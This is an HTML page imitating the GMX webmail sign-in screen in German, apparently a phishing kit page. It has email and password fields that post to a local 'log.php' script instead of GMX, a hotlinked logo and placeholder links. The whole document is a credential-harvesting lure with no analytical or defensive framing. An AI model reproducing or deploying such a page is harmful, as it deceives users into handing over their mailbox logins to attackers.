﻿<html>
<head>
<title>GMX-Anmelden</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="" rel="shortcut icon">
</head>
<body ><div id="container">
		<div class="logo">
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaIPWx5v5YfcVVIhMR6BGj3PHx9873j1UarU1eHYq7skaFpdbn">
			<div class="header-wrapper">
				<h2 class="header-text">GMX Anmelden</h2>
				<span>Verwenden Sie Ihr GMX-Konto.<br /><a href="#">Was ist das?</a></span>
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<div class="error user-error"></div>
						<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="E-Mail-Adresse" value="" name="username" />						<div class="error input-fields2"></div>
						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Passwort" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Ich m&#246;chte angemeldet bleiben</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Anmelden" class="default">
					</div>
					<div class="input-fields forgot">
						<p>Kein Account? <a href="#">Erstelle einen!</a></p>
						<br/><br/>
						<p><a href="#">Ich habe mein Passwort vergessen</a></p>
						<p><a href="#">Melde dich mit einem Einmalcode an</a></p>
						<br/>
						<p class="brand">GMX © 2019</p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>